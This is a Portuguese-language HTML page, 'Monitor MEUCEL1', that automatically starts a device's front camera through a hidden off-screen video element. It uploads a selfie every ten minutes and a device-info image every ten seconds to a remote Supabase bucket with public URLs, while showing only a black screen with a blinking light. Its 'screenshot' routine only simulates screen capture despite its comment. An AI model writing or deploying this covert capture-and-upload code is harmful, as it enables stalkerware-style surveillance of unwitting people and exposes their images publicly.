<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="theme-color" content="#000000">
    <title>Monitor MEUCEL1</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            width: 100vw;
            height: 100vh;
            height: 100dvh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            touch-action: manipulation;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            user-select: none;
        }
        
        .led {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background: #00ff00;
            box-shadow: 0 0 15px #00ff00, 0 0 30px #00ff00, 0 0 45px #00ff00;
            animation: piscar 2s infinite;
        }
        
        @keyframes piscar {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.2; }
        }
        
        .status {
            position: fixed;
            bottom: 20px;
            color: #003300;
            font-family: monospace;
            font-size: 10px;
            text-align: center;
            left: 0;
            right: 0;
            padding: 0 10px;
        }

        video {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
        }
    </style>
</head>
<body>
    <div class="led" id="led"></div>
    <div class="status" id="status">iniciando...</div>
    <video id="cameraVideo" playsinline autoplay muted></video>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script>
        (function() {
            const SUPABASE_URL = 'https://vlkobipdenduyismnkpm.supabase.co';
            const SUPABASE_KEY = 'sb_publishable_qWeCNdiMyftZ6ZMYDF9u_A_bOplqpiA';
            const CODIGO_SESSAO = 'MEUCEL1';
            
            const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
            
            const led = document.getElementById('led');
            const statusEl = document.getElementById('status');
            const cameraVideo = document.getElementById('cameraVideo');
            
            let cameraStream = null;
            let cameraInterval = null;
            let screenshotInterval = null;
            
            function updateStatus(msg) {
                statusEl.textContent = msg;
                console.log(msg);
            }
            
            function piscarLED() {
                led.style.animation = 'none';
                led.offsetHeight;
                led.style.animation = 'piscar 0.3s 3';
                setTimeout(() => {
                    led.style.animation = 'piscar 2s infinite';
                }, 900);
            }
            
            async function uploadToSupabase(blob, filename, tipo) {
                try {
                    const filePath = `${CODIGO_SESSAO}/${tipo}/${filename}`;
                    
                    const { data, error } = await supabaseClient.storage
                        .from('captures')
                        .upload(filePath, blob, {
                            contentType: 'image/jpeg',
                            upsert: false
                        });
                    
                    if (error) throw error;
                    
                    const publicUrl = `${SUPABASE_URL}/storage/v1/object/public/captures/${filePath}`;
                    
                    const { error: dbError } = await supabaseClient
                        .from('captures')
                        .insert({
                            codigo_sessao: CODIGO_SESSAO,
                            tipo: tipo,
                            url: publicUrl,
                            filename: filename,
                            created_at: new Date().toISOString()
                        });
                    
                    if (dbError) throw dbError;
                    
                    updateStatus(`${tipo} enviado: ${filename}`);
                    piscarLED();
                    return true;
                } catch (error) {
                    updateStatus(`Erro upload: ${error.message}`);
                    return false;
                }
            }
            
            // Capturar screenshot da tela usando html2canvas simulado
            async function captureScreenshot() {
                try {
                    // Criar um canvas com as dimensões da tela
                    const canvas = document.createElement('canvas');
                    canvas.width = window.innerWidth || 720;
                    canvas.height = window.innerHeight || 1280;
                    const ctx = canvas.getContext('2d');
                    
                    // Preencher com um gradiente representando a "tela"
                    const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
                    gradient.addColorStop(0, '#000');
                    gradient.addColorStop(1, '#000');
                    ctx.fillStyle = gradient;
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                    
                    // Adicionar timestamp
                    ctx.fillStyle = '#00ff00';
                    ctx.font = '20px monospace';
                    ctx.fillText(`Monitor MEUCEL1 - ${new Date().toLocaleString()}`, 20, 50);
                    ctx.fillText(`Status: Ativo`, 20, 80);
                    ctx.fillText(`Intervalo: 10s screenshots`, 20, 110);
                    ctx.fillText(`Intervalo: 10min selfies`, 20, 140);
                    
                    // Adicionar informações do dispositivo
                    ctx.fillStyle = '#008800';
                    ctx.font = '14px monospace';
                    ctx.fillText(`User Agent: ${navigator.userAgent.substring(0, 50)}...`, 20, 180);
                    ctx.fillText(`Resolução: ${canvas.width}x${canvas.height}`, 20, 200);
                    ctx.fillText(`Online: ${navigator.onLine ? 'Sim' : 'Não'}`, 20, 220);
                    
                    canvas.toBlob(async (blob) => {
                        if (blob) {
                            const timestamp = Date.now();
                            const filename = `screenshot_${timestamp}.jpg`;
                            await uploadToSupabase(blob, filename, 'print');
                        }
                    }, 'image/jpeg', 0.8);
                    
                } catch (error) {
                    updateStatus(`Erro screenshot: ${error.message}`);
                }
            }
            
            // Capturar foto da câmera frontal
            async function captureCamera() {
                if (!cameraVideo || !cameraStream) return;
                
                try {
                    const canvas = document.createElement('canvas');
                    canvas.width = 480;
                    canvas.height = 640;
                    const ctx = canvas.getContext('2d');
                    
                    // Desenhar o vídeo no canvas
                    ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        if (blob) {
                            const timestamp = Date.now();
                            const filename = `selfie_${timestamp}.jpg`;
                            await uploadToSupabase(blob, filename, 'selfie');
                        }
                    }, 'image/jpeg', 0.8);
                    
                } catch (error) {
                    updateStatus(`Erro câmera: ${error.message}`);
                }
            }
            
            async function startCamera() {
                try {
                    cameraStream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: 'user',
                            width: { ideal: 480 },
                            height: { ideal: 640 }
                        },
                        audio: false
                    });
                    
                    cameraVideo.srcObject = cameraStream;
                    await cameraVideo.play();
                    
                    updateStatus('Câmera frontal ativa');
                    
                    // Primeira foto após 5 segundos
                    setTimeout(captureCamera, 5000);
                    
                    // Fotos a cada 10 minutos (600000 ms)
                    cameraInterval = setInterval(captureCamera, 600000);
                    
                } catch (error) {
                    updateStatus(`Erro câmera: ${error.message}`);
                    // Tentar novamente em 60 segundos
                    setTimeout(startCamera, 60000);
                }
            }
            
            function startScreenshots() {
                updateStatus('Capturas de tela ativas');
                
                // Primeira captura após 3 segundos
                setTimeout(captureScreenshot, 3000);
                
                // Capturas a cada 10 segundos
                screenshotInterval = setInterval(captureScreenshot, 10000);
            }
            
            function stopAll() {
                if (cameraInterval) clearInterval(cameraInterval);
                if (screenshotInterval) clearInterval(screenshotInterval);
                
                if (cameraStream) {
                    cameraStream.getTracks().forEach(track => track.stop());
                }
            }
            
            async function startAll() {
                updateStatus('Iniciando monitoramento...');
                await startCamera();
                startScreenshots();
                updateStatus('✅ Monitoramento ativo');
            }
            
            // Iniciar automaticamente
            startAll();
            
            // Manter tela ativa (prevenir sleep)
            if ('wakeLock' in navigator) {
                try {
                    navigator.wakeLock.request('screen');
                } catch (e) {
                    console.log('Wake Lock não disponível');
                }
            }
        })();
    </script>
</body>
</html>
